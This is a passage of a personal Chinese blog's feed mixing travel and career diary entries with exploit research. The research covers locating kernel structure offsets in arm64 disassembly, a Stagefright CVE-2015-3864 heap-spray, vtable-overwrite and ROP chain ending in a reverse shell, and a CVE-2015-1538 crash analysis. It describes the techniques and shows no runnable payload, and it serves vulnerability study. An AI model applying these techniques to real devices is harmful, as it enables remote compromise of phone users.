class="line"><span class="number">0xffffffc0001a4cdc</span>: cmp w2, w0</span><br><span class="line"><span class="number">0xffffffc0001a4ce0</span>: b.eq    <span class="preprocessor">#<span class="number">0xffffffc0001a4fa0</span></span></span><br><span class="line">...</span><br><span class="line"><span class="number">0xffffffc0001a4fa0</span>: movz    w0, <span class="preprocessor">#<span class="number">0x15</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fa4</span>: ldr x19, [x21, <span class="preprocessor">#<span class="number">0x28</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fa8</span>: bl  <span class="preprocessor">#<span class="number">0xffffffc0000a7294</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fac</span>: uxtb    w0, w0</span><br><span class="line"><span class="number">0xffffffc0001a4fb0</span>: cbz w0, <span class="preprocessor">#<span class="number">0xffffffc0001a51a0</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fb4</span>: ldr x0, [x19, <span class="preprocessor">#<span class="number">0x30</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fb8</span>: ldr x0, [x0, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fbc</span>: cbz x0, <span class="preprocessor">#<span class="number">0xffffffc0001a5218</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fc0</span>: mov x0, x19</span><br><span class="line"><span class="number">0xffffffc0001a4fc4</span>: bl  <span class="preprocessor">#<span class="number">0xffffffc000197d18</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fc8</span>: b   <span class="preprocessor">#<span class="number">0xffffffc0001a4e84</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fcc</span>: ldrh    w0, [x21]</span><br><span class="line"><span class="number">0xffffffc0001a4fd0</span>: and w0, w0, <span class="preprocessor">#<span class="number">0xf000</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fd4</span>: cmp w0, <span class="preprocessor">#<span class="number">8</span>, lsl #<span class="number">12</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fd8</span>: b.eq    <span class="preprocessor">#<span class="number">0xffffffc0001a5100</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fdc</span>: ldr x0, [x19, <span class="preprocessor">#<span class="number">0x28</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe0</span>: cbz x0, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fe4</span>: ldr x3, [x0, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe8</span>: cbz x3, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fec</span>: mov w1, w2</span><br><span class="line"><span class="number">0xffffffc0001a4ff0</span>: mov x0, x19</span><br><span class="line"><span class="number">0xffffffc0001a4ff4</span>: mov x2, x20</span><br><span class="line"><span class="number">0xffffffc0001a4ff8</span>: blr x3</span><br><span class="line"><span class="number">0xffffffc0001a4ffc</span>: cmn w0, <span class="preprocessor">#<span class="number">0x203</span></span></span><br><span class="line"><span class="number">0xffffffc0001a5000</span>: b.ne    <span class="preprocessor">#<span class="number">0xffffffc0001a4e84</span></span></span><br><span class="line"><span class="number">0xffffffc0001a5004</span>: movn    w0, <span class="preprocessor">#<span class="number">0x18</span></span></span><br><span class="line"><span class="number">0xffffffc0001a5008</span>: b   <span class="preprocessor">#<span class="number">0xffffffc0001a4e84</span></span></span><br><span class="line"><span class="number">0xffffffc0001a500c</span>: mov x0, sp</span><br><span class="line"><span class="number">0xffffffc0001a5010</span>: and x1, x0, <span class="preprocessor">#<span class="number">0xffffffffffffc000</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>代码比较长，直接看是看不出来的，查看源码中函数调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">    error = -ENOTTY;</span><br></pre></td></tr></table></figure>
<p>返回值会与<code>ENOIOCTLCMD</code>做比较，查找源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define ENOIOCTLCMD    515    /&#65290; No ioctl command &#65290;/</span><br></pre></td></tr></table></figure>
<p>返回值在w0或x0中，直接在反汇编中搜特征值515对应的16进制0x203，如果结果过多，可以通过查看前后调用相关寄存器操作等其他特征进一步确定，这里就找到一处，定位到调用代码片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc0001a4fdc</span>: ldr x0, [x19, <span class="preprocessor">#<span class="number">0x28</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe0</span>: cbz x0, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fe4</span>: ldr x3, [x0, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe8</span>: cbz x3, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fec</span>: mov w1, w2</span><br><span class="line"><span class="number">0xffffffc0001a4ff0</span>: mov x0, x19</span><br><span class="line"><span class="number">0xffffffc0001a4ff4</span>: mov x2, x20</span><br><span class="line"><span class="number">0xffffffc0001a4ff8</span>: blr x3</span><br><span class="line"><span class="number">0xffffffc0001a4ffc</span>: cmn w0, <span class="preprocessor">#<span class="number">0x203</span></span></span><br></pre></td></tr></table></figure>
<p>所以x0为f_op指针，其偏移0x40即为tty_ioctl地址。</p>
<h2 id="总结">总结</h2><ol>
<li>内核漏洞利用过程中，不管是path哪些地址，最好的方法就是直接找到该地方调用处，然后根据编译好的kernel文件去定位。</li>
<li>同样在找结构体偏移值时，通过调用地方查看寄存器传参来确定偏移值，如果通过源码计算不仅麻烦还容易算错。</li>
<li>多读源码涨姿势。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>主要针对arm64，现在ida6.8并不支持arm64的反汇编，所以在定位代码过程中会很麻烦，而32位是直接可以f5对照源码看的。</p>]]>
    
    </summary>
    
      <category term="kernel" scheme="http://blog.idhyt.com/tags/kernel/"/>
    
      <category term="symbol" scheme="http://blog.idhyt.com/tags/symbol/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一场说走就走的旅行]]></title>
    <link href="http://blog.idhyt.com/2016/05/02/diary-stay-away-trip/"/>
    <id>http://blog.idhyt.com/2016/05/02/diary-stay-away-trip/</id>
    <published>2016-05-02T15:21:01.000Z</published>
    <updated>2016-05-25T16:16:35.000Z</updated>
    <content type="html"><![CDATA[<blockquote class="blockquote-center">人生至少要有两次冲动，一为奋不顾身的爱情，一为说走就走的旅行。</blockquote>

<a id="more"></a>
<p>当然，这话不是我说的。<br>每次出去都要计划好路线和攻略，希望整个旅行都在自己控制的时间段内完成，事实也确实如此。<br>这一次，没有计划，没有攻略，没有目的，没有时间点，一个人，说走就走。</p>
<iframe src="https://www.google.com/maps/d/embed?mid=1ofAIHkM96BbJVMvnmqD4DrUNid4" width="640" height="480"></iframe>

<p>上面是我大概去过的地方(google map如果看不到你懂得，参见第一张图)，原来每次出去玩都是奔着景点，造成的结果就是长途跋涉，身心疲惫。<br>后来跟着摄影爱好者加被帐篷爬各种野山的人出去几次后，看了很多美景。<br>像这样：<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-01.jpg" alt="diary-stay-away-trip-01"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-06.jpg" alt="diary-stay-away-trip-06"></p>
<p>这样：<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-02.jpg" alt="diary-stay-away-trip-02"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-03.jpg" alt="diary-stay-away-trip-03"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-04.jpg" alt="diary-stay-away-trip-04"></p>
<p>当然，还有这样：<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-05.jpg" alt="diary-stay-away-trip-05"></p>
<p>看多了大自然的野山野水，觉得每个地方的景点也就平平无奇。现在出去旅行的心态就是为了放松，到每个城市，不刻意去景点，想象自己就在这座城市生活工作，让自己融入其中，感受下当地人民的生活，走走吃吃停停，放空自己。</p>
<p>出发之前先去广州找了几个基友玩了一天，打了一晚上迷一样的桌球，少一点真诚，多一点套路。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-20.jpg" alt="diary-stay-away-trip-20"></p>
<p>然后去了长沙，到长沙第一天为了放慢节奏先去电影院看了场电影，然后在附近瞎走走晚上出去吃了路边摊。<br>第二天去了湖大，环境不错，就在学校呆了一天，可惜自习室不给进。<br>第三天去了步行街，晚上吃了小龙虾，下午还突然来一场暴雨，吓到我赶紧掏出电脑了一行代码压压惊。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-07.jpg" alt="diary-stay-away-trip-07"></p>
<p>北上去了武汉，去武大看樱花，嗯，樱花真漂亮～<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-08.jpg?imageMogr2/rotate/90" alt="diary-stay-away-trip-08"></p>
<p>然而实际上，连花瓣都没了，晚来了几天，只有这个纪念品了，真是个悲伤的故事。<br>继续北上回家呆了一周，然后决定去苏州，发现真是做了一个机智的决定。</p>
<p>苏州这座城市太神奇了，一来便爱上，这里仿佛就是一个古老的城镇，随处可见的小桥流水。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-22.jpg?imageMogr2/rotate/90" alt="diary-stay-away-trip-22"></p>
<p>但是城镇中竟然有所有你想的到的现代化工具公交地铁商场，每天出门瞎晃悠总有一种穿越的感觉。<br>我在想，每天晒晒太阳喝喝茶，没事出去晃一晃的苏州人民，幸福指数会爆表嘛？<br>第一天去了苏州大学，很有感觉，古色古香充满浓重的文学气息，在这样的学校读书，幸福指数会爆表吗？<br>第二天早上去了拙政园看园林，网上买好票，机智的我在门口等了一个带团的导游，然后就屁颠屁颠的跟着后边听讲解，然后自己有慢慢悠悠晃了一圈。虽然不是旺季也不是节假日，但人依然很多，各种各样的花也开的差不多了，还是很漂亮。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-09.jpg" alt="diary-stay-away-trip-09"></p>
<p>其实早上打算先去苏州博物馆的，因为和拙政园挨着，但是我睡醒到那边都10点半了，不知道和周一闭馆有没有原因，排队的人超级超级超级超级多，然后就先去拙政园了，然后1点出来发现竟然就10来个人在排队了，所以很轻松的进去了。我也没什么鉴赏文艺的细胞，所以就在里边瞎看看，不过博物馆还是挺漂亮的。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-10.jpg" alt="diary-stay-away-trip-10"></p>
<p>在桃花坞那里的青旅住了一周多，每天就是睡到自然醒，然后出去觅食，不知不觉就逛了很多地方，观前街，七里山塘，平江历史街区，还有不知名的地方。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-11.jpg?imageMogr2/rotate/90" alt="diary-stay-away-trip-11"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-12.jpg" alt="diary-stay-away-trip-12"></p>
<p>晚上回来在一楼的小酒吧坐着听看那个帅小哥弹琴，还会逗一逗睡觉的猫咪。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-13.jpg" alt="diary-stay-away-trip-13"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-14.jpg" alt="diary-stay-away-trip-14"></p>
<p>住青旅最好的一点就是会认识很多旅途中的人，认识了一个刚工作半年就裸体出来旅行的码农，处于迷茫期，跟他聊了很多，还挺有意思。还有三个大学生出来创业，各种有意思的事情，想想自己大学的时候，还在宿舍默默的打游戏，自愧不如啊。这家青旅还是挺有感觉，墙上贴面了火车票和明信片，还有留言本，晚上没事翻了翻，里边很多驴友有意思的旅行纪录，从哪里来，为何要来这里，下一站又要去哪里，旅行的意义大概如此吧。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-15.jpg" alt="diary-stay-away-trip-15"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-16.jpg" alt="diary-stay-away-trip-16"></p>
<p>由于其他原因，时间不能继续放空，最后去了杭州，其实最开始目标就是这里啦。<br>或许对杭州的期待过高，又或许是因为苏州太合我的胃口，总觉得杭州并没有想象中的那么吸引我。<br>好像当初去云南一样，其实对丽江和洱海期望最高，但是也是先去了泸沽湖，然后到洱海后发现，还是泸沽湖最漂亮。<br>所以，想象中期待的并不一定是最好的，最好的可能就出现在途中，给自己多一些选择不是坏事。<br>在杭州呆了将近四天，基本步行绕西湖一圈，那两天一直毛毛细雨，还是挺有感觉的。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-17.jpg" alt="diary-stay-away-trip-17"></p>
<p>雷峰塔，灵隐寺，还去浙大留学生餐厅吃了几顿饭，真的好便宜，味道还ok。<br>还有朋友极力推荐的云栖竹径，有点远，不过公交车还挺方便，出来的时候还碰到了一只小松鼠。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-18.jpg" alt="diary-stay-away-trip-18"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-19.jpg" alt="diary-stay-away-trip-19"></p>
<p>杭州过后就回去了，其实很想在苏杭一代多住几天，还想着去厦门和南京，毕竟已经在外边快一个月了，该滚回去搬砖了。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-21.jpg" alt="diary-stay-away-trip-21"></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote class="blockquote-center">人生至少要有两次冲动，一为奋不顾身的爱情，一为说走就走的旅行。</blockquote>]]>
    
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一定要更加努力]]></title>
    <link href="http://blog.idhyt.com/2016/04/06/diary-work-harder/"/>
    <id>http://blog.idhyt.com/2016/04/06/diary-work-harder/</id>
    <published>2016-04-05T17:38:11.000Z</published>
    <updated>2016-05-25T16:28:48.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;下山了，真的下山了，感谢陪伴我的小伙伴和充满基友的团队以及带过我的老大们还有智慧与美貌并存的神仙姐姐们，特别要感谢美丽的珠海，这个来了不想走的城市，真的离开了，却不知道如何道别。</p>
<a id="more"></a>
<hr>

<p>&#160; &#160; &#160; &#160;刚毕业的学生大多是感性的，第一份工作都是存在很多感情吧，对这里的小伙伴有感情，对公司有感情，所以总是满怀期待的希望能够与公司共同成长，从金山网络到上市成为猎豹移动，公司的成长真的很快，可是我确停滞了，当我明确知道自己需要时间沉淀的时候，发现已经不能适应这里的环境了。算上实习差不多刚好两年，都说第一份工作最好做够三年，对于互联网这种企业文化， 可能三年真的是太久了，我等不了，怕再等下去真的要迷失在这个温柔的城市。工作的第一年总感觉自己是在滚雪球，体型是大了，可里边是空的，我一直迷失在这种自我感觉良好的状态之中，按时工作按时完成任务，晚上回家看了很多新鲜的事物，觉得很多东西都很好玩，错误的认为从对一个东西的不知到知是一个快速成长的过程。病毒，web漏洞，前端，各种编程语言还有一些奇奇怪怪的东西，仿佛看到了一片森林，然后迷失了方向，又回到大学毕业时候的状态，什么都会，确又什么都不会。做事情总是徘徊在第一步，第二步，第三步没有了，遇到问题停滞了。</p>
<hr>

<p>&#160; &#160; &#160; &#160;身边确实有一些人是从开始就明确知道自己想要什么，该做什么，可我却和大部分人一样要经历很久的迷茫期，高三，大四都是如此，或许每个人都会在特定的时间点会想明白一些事情，当我真正的正视了自己存在的问题，曾经工作中得过且过的状态全都被放大化，细细想一想一年多了，自己的成长在哪里。一起来的小伙伴都已经离去大半，有的去创业，有的去更好的公司，那段时间我也特别浮躁，可是我连以后的方向和想做什么都还想不好，我怎能说服自己以后会好的。真的有太多美好的事情都这样不知不觉随着时间消逝，而自己一边贪婪享受着安逸的现状的同时确又在不断抱怨没有思考和创造力的生活。</p>
<hr>

<p>&#160; &#160; &#160; &#160;既然想清楚了，那就是该告别的时候了，越长大越开始觉得大人说的话确实有道理，可惜全都是自己经历过后才真的明白，弯路半米都少走不了，我现在能力所能看到想到的就只有这些，过简单的生活，做简单的事情，不为我从哪里来，我又要到哪里去这些大道理所困扰，做自己认为对的事情，这样挺好不是？不能再感性的留恋这里，这样的状态，不曾想过自己能成长到哪里，如果再不咬牙努力，可能就真看不到努力后的自己。</p>
<hr>

<p>&#160; &#160; &#160; &#160;离职办完，坐在卡位上看着空荡荡的桌子，真的特别蒙逼，仿佛追了一个妹子两年没追到又爱又恨，又仿佛做了一场关于成长的梦，可是这一切都在这个时间点结束了。怀念那夕阳下奔跑的金山网络，君子之交淡如水，离别是为了更好的重逢，一定要更加努力，共勉！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;下山了，真的下山了，感谢陪伴我的小伙伴和充满基友的团队以及带过我的老大们还有智慧与美貌并存的神仙姐姐们，特别要感谢美丽的珠海，这个来了不想走的城市，真的离开了，却不知道如何道别。</p>]]>
    
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2015-3864]]></title>
    <link href="http://blog.idhyt.com/2016/03/15/exploit-cve-2015-3864/"/>
    <id>http://blog.idhyt.com/2016/03/15/exploit-cve-2015-3864/</id>
    <published>2016-03-15T14:06:11.000Z</published>
    <updated>2016-07-07T14:07:28.000Z</updated>
    <content type="html"><![CDATA[<p>cve-2015-3864是<a href="http://blog.idhyt.com/2016/03/13/exploit-cve-2015-1538/">cve-2015-1538</a>同系列中的另外一个漏洞，利用的是解析tx3g中整型上溢，google公布的<a href="https://www.exploit-db.com/exploits/38226/" target="_blank" rel="external">exploit-38226</a>中通过利用<strong>jemalloc</strong>的特性对内存进行巧妙的布局，溢出后基本能100%覆盖到MPEG4DataSource的虚表指针。<br>2016年3月18号NorthBit公布了一篇文章<a href="https://www.exploit-db.com/docs/39527.pdf" target="_blank" rel="external">Metaphor A (real) real­life Stagefright exploit</a>，在google的基础上通过信息泄漏绕过aslr。</p>
<p>其中内存布局原理(摘自Metaphor)：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-exploit-princple.png" alt=""></p>
<p>pssh：消耗内存碎片，留下大块内存。解析期间不会释放掉，大小可控。<br>titl/gnre：内存占位，解析到第二个先申请新的然后会释放之前的。<br>同时pssh堆喷中，分配大于0x40000长度会调用mmap函数，mmap()地址8位随机，需要预测堆喷地址。</p>
<p>总结下来：<br>通过pssh atoms堆喷使新的的heap runs可预测。<br>申请titl和gnre占位。<br>解析stbl box后创建MPEG4DataSource对象，复用titl。<br>解析tx3g box复用gnre。<br>溢出覆盖虚表指针。</p>
<p>调试过程(Nexus5 andorid 5.01)：</p>
<p>1.MPEG4DataSource对象复用titl<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-vTable.png" alt=""></p>
<p>2.tx3g复用gnre<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-overflow_tx3g.png" alt=""></p>
<p>3.memcpy溢出覆盖vTable<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-overflow.png" alt=""></p>
<p>4.调用mDataSource-&gt;readAt控制流程<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-blx-rop.png" alt=""></p>
<p>5.gadget1<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-gadget1.png" alt=""></p>
<p>6.gadget2<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-gadget2.png" alt=""></p>
<p>7.gadget3<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-gadget3.png" alt=""></p>
<p>8.mprotect<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-mprotect.png" alt=""></p>
<p>9.执行mprotect后通过gadget2和gadget3调整堆栈然后跳入shellcode<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-3864-shellcode.png" alt=""></p>
<p>最后shell_reverse_tcp<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-expsucce.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>cve-2015-3864是<a href="http://blog.idhyt.com/2016/03/13/exploit-cve-2015-1538/">cve-2015-1538</a>同系列中的另外一个漏洞，利用的是解析tx3g中整型上溢，google公布的<a ]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="libstagefright" scheme="http://blog.idhyt.com/tags/libstagefright/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2015-1538 libstagefright漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2016/03/13/exploit-cve-2015-1538/"/>
    <id>http://blog.idhyt.com/2016/03/13/exploit-cve-2015-1538/</id>
    <published>2016-03-13T13:49:11.000Z</published>
    <updated>2017-01-02T08:59:09.000Z</updated>
    <content type="html"><![CDATA[<h2 id="漏洞分析">漏洞分析</h2><p>POC直接使用<a href="https://github.com/jduck/cve-2015-1538-1" target="_blank" rel="external">https://github.com/jduck/cve-2015-1538-1</a>生成的mp4文件，作者说明了这个exp并不通用，我的测试机为nexus-5-android-4.4，只能造成崩溃。<br>崩溃信息：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">03-13 13:19:33.130 14267 14267 I DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***</span><br><span class="line">03-13 13:19:33.130 14267 14267 I DEBUG   : Build fingerprint: 'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'</span><br><span class="line">03-13 13:19:33.130 14267 14267 I DEBUG   : Revision: '11'</span><br><span class="line">03-13 13:19:33.130 14267 14267 I DEBUG   : pid: 17874, tid: 17928, name: Binder_1  &gt;&gt;&gt; /system/bin/mediaserver &lt;&lt;&lt;</span><br><span class="line">03-13 13:19:33.130 14267 14267 I DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 41d00010</span><br><span class="line">03-13 13:19:33.140 15745 15836 W NativeCrashListener: Couldn't find ProcessRecord for pid 17874</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     r0 41d00010  r1 00d00000  r2 001ed3c9  r3 00000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   : AM write failure (32 / Broken pipe)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     r4 b5b40030  r5 000000da  r6 2a0480a0  r7 00000a38</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     r8 0000000c  r9 b5b40034  sl 00000008  fp 2a0480a4</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     ip 41d00000  sp b5b40010  lr b697edaf  pc b697ed3a  cpsr 000f0030</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d0  0000001000000079  d1  0000000000000061</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d2  7472616b6d6f6f64  d3  6d696e666d6469a9</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d4  4242424242424242  d5  4242424242424242</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d6  4242424242424242  d7  4242424242424242</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d8  0000000000000000  d9  0000000000000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d10 0000000000000000  d11 0000000000000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d12 0000000000000000  d13 0000000000000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d14 0000000000000000  d15 0000000000000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d16 3f96de83a904ab51  d17 3f50624dd2f1a9fc</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d18 41cc356335800000  d19 3fc35fe27b800000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d20 3fc5533fc2a45f6a  d21 bf66be3f0c22dc9a</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d22 3fc2e2cedd55ea5c  d23 3fe0000000000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d24 3f88b0d283c30939  d25 bf88b0d28a518506</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d26 0000000000000000  d27 4000000000000000</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d28 3ffda3a6245542b4  d29 bfc4eaefa4251850</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     d30 3ff0000000000000  d31 3fe29d5df484a30a</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     scr 60000010</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   : </span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   : backtrace:</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #00  pc 0007dd3a  /system/lib/libstagefright.so (android::SampleTable::setSampleToChunkParams(long long, unsigned int)+137)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #01  pc 00062f8d  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+2816)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #02  pc 0006271f  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+658)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #03  pc 0006271f  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+658)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #04  pc 0006271f  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+658)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #05  pc 0006271f  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+658)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #06  pc 0006271f  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+658)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #07  pc 00063aaf  /system/lib/libstagefright.so (android::MPEG4Extractor::readMetaData()+46)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #08  pc 00063d6d  /system/lib/libstagefright.so (android::MPEG4Extractor::getMetaData()+8)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #09  pc 0007f695  /system/lib/libstagefright.so (android::StagefrightMetadataRetriever::getFrameAtTime(long long, int)+28)</span><br><span class="line">03-13 13:19:33.180 14267 14267 I DEBUG   :     #10  pc 00035945  /system/lib/libmediaplayerservice.so (android::MetadataRetrieverClient::getFrameAtTime(long long, int)+64)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>查看堆栈调用，最后崩溃在：android::SampleTable::setSampleToChunkParams(long long, unsigned int)+137，非法地址41d00010，该值与R0寄存器值相等，猜想对该寄存器操作导致。<br>ida反汇编libstagefright.so定位到该行代码</p>
